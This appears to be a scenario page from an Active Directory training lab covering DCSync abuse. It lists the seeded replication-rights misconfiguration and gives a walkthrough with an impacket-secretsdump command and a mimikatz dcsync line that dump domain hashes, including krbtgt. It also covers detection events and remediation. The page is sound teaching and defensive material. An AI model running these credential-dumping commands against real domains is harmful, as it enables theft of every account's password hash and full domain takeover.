# Scenario 8 - DCSync Rights

| | |
|---|---|
| **MITRE ATT&CK** | T1003.006 - OS Credential Dumping: DCSync |
| **Toggle** | `misconfig.dcsync` |
| **Role** | `misconfig_dcsync` |
| **Foothold** | `svc_dcsync` (weak service password) |

## Objective

Replicate password hashes directly from a domain controller by abusing the
directory replication extended rights, without executing code on the DC.

## Seeded configuration

`svc_dcsync` is granted the three replication extended rights on the domain
naming context:

| Right | GUID |
|-------|------|
| DS-Replication-Get-Changes | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
| DS-Replication-Get-Changes-All | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |
| DS-Replication-Get-Changes-In-Filtered-Set | `89e95b76-444d-4c62-991a-0facbeda640c` |

These are normally reserved for domain controllers. With them, an ordinary
account can pull secrets the same way a DC does.

## Attack walkthrough

```bash
# 1. Recover svc_dcsync's password (round-robin of scenario 1/2 techniques).
# 2. Dump all domain hashes remotely.
impacket-secretsdump 'corp.contoso.lab/svc_dcsync:<password>'@10.10.10.10 \
  -just-dc-ntlm

# Mimikatz equivalent, if you have any execution on a Windows box:
#   lsadump::dcsync /domain:corp.contoso.lab /user:krbtgt
```

A recovered `krbtgt` hash enables a Golden Ticket; a Domain Admin NTLM hash
enables pass-the-hash.

### BloodHound view

The domain node has inbound `DCSync` edges from `svc_dcsync`. The engine's
shortest-path search ranks this as the cheapest route (edge weight `0.3`,
"trivial") and the report maps it to T1003.006.

## Detection

- **4662** - Replicated directory changes, especially with the replication
  GUIDs in `Properties`, requested by a non-DC account.
- **Directory Service Access** auditing enabled on the domain NC.
- Defender for Identity: "Suspicious replication of directory services".

## Remediation

- Remove the replication extended rights from all non-Tier-0 principals.
- Audit DACLs on the domain naming context regularly.
- Treat any account with these rights as Tier 0 and protect it accordingly.
- Rotate `krbtgt` twice if a DCSync is suspected.

## References

- MITRE T1003.006
- Microsoft: "Detecting DCSync"
